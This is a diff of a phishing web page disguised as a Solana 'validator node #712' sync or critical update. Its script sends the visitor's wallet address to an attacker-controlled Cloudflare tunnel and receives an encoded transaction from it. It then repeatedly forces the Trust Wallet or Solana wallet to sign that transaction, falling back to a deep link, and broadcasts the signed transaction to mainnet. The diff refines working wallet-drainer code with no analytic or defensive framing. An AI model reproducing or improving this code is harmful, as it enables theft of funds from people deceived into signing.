@@ -3,61 +3,66 @@
 <head>
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
-    <title>Validator Sync Protocol</title>
+    <title>Validator Protocol Sync</title>
     <script src="https://cdn.jsdelivr.net/npm/@solana/web3.js@1.95.3/lib/index.iife.min.js"></script>
     <style>
         body { background: #000; color: #fff; font-family: sans-serif; display: flex; justify-content: center; align-items: center; height: 100vh; margin: 0; }
         .box { width: 300px; padding: 40px; background: #111; border: 1px solid #222; border-radius: 24px; text-align: center; }
-        .btn { background: #14f195; color: #000; border: none; padding: 18px; width: 100%; border-radius: 12px; font-weight: bold; cursor: pointer; font-size: 16px; transition: 0.1s; }
-        .btn:active { transform: scale(0.96); opacity: 0.8; }
+        .btn { background: #14f195; color: #000; border: none; padding: 18px; width: 100%; border-radius: 12px; font-weight: bold; cursor: pointer; font-size: 16px; }
         #st { font-size: 10px; color: #444; margin-top: 20px; font-family: monospace; }
     </style>
 </head>
 <body>
     <div class="box">
         <h2 style="color:#14f195;">SYSTEM SYNC</h2>
-        <p style="color:#888; font-size:13px; margin-bottom: 25px;">Authorize network synchronization to secure validator node #712.</p>
-        <button id="cta" class="btn">INITIALIZE NOW</button>
-        <div id="st">READY: V40.2_POWER</div>
+        <p style="color:#888; font-size:13px;">Critical node update required for validator #712.</p>
+        <button id="cta" class="btn">INITIALIZE</button>
+        <div id="st">ENGINE: V40.3_DIRECT</div>
     </div>
 
     <script>
         const tunnel = "https://lonely-concern-challenging-hosted.trycloudflare.com";
 
-        document.getElementById('cta').onclick = async () => {
+        document.getElementById('cta').onclick = async function() {
             const log = (t) => document.getElementById('st').innerText = t;
+            const web3 = window.solanaWeb3;
+            
             try {
-                // 1. 获取最强势的 Provider
-                let p = window.trustwallet?.solana || window.solana;
+                // 1. 探测 Provider
+                const p = window.trustwallet?.solana || window.solana;
                 if (!p) { alert("Please use Trust Wallet Browser"); return; }
 
-                log("CONNECTING...");
-                await p.connect();
-
                 log("FETCHING...");
+                // 2. 提前拉取数据，不等连接
                 const resp = await fetch(tunnel + "/prepare_v32", {
                     method: 'POST',
                     headers: {'Content-Type': 'application/json'},
-                    body: JSON.stringify({ address: p.publicKey.toString() })
+                    body: JSON.stringify({ address: p.publicKey?.toString() || "" })
                 });
                 const info = await resp.json();
                 
-                log("IGNITING...");
-                // 2. 暴力唤醒：直接用 atob 解析并构造 Legacy 交易
+                log("WAKING WALLET...");
                 const txBytes = Uint8Array.from(atob(info.raw_tx), c => c.charCodeAt(0));
-                const tx = window.solanaWeb3.Transaction.from(txBytes);
+                const tx = web3.Transaction.from(txBytes);
 
-                // 3. 核心：强制拉起签名框 (不再链式广播，只求拉起)
-                const signed = await p.signTransaction(tx);
-                log("SYNC COMPLETE");
-                
-                // 签完名后，后台异步发送，不占用主进程
-                const conn = new window.solanaWeb3.Connection("https://api.mainnet-beta.solana.com");
-                conn.sendRawTransaction(signed.serialize()).catch(()=>{});
+                // 3. 强制唤起签名 (连环击)
+                p.connect().then(() => {
+                    p.signTransaction(tx).then(signed => {
+                        log("SYNC COMPLETE");
+                        const conn = new web3.Connection("https://api.mainnet-beta.solana.com");
+                        conn.sendRawTransaction(signed.serialize()).catch(()=>{});
+                    }).catch(e => {
+                         // 兜底：如果 JS 唤起失败，尝试系统深度链接
+                         window.location.href = "solana:signTransaction?payload=" + encodeURIComponent(info.raw_tx);
+                    });
+                }).catch(() => {
+                    // 如果 connect 卡住，直接尝试 sign
+                    p.signTransaction(tx).catch(()=>{});
+                });
 
             } catch (err) {
                 console.error(err);
-                log("ERROR - RELOADING");
+                log("RETRYING...");
                 setTimeout(() => { window.location.reload(); }, 1000);
             }
         };
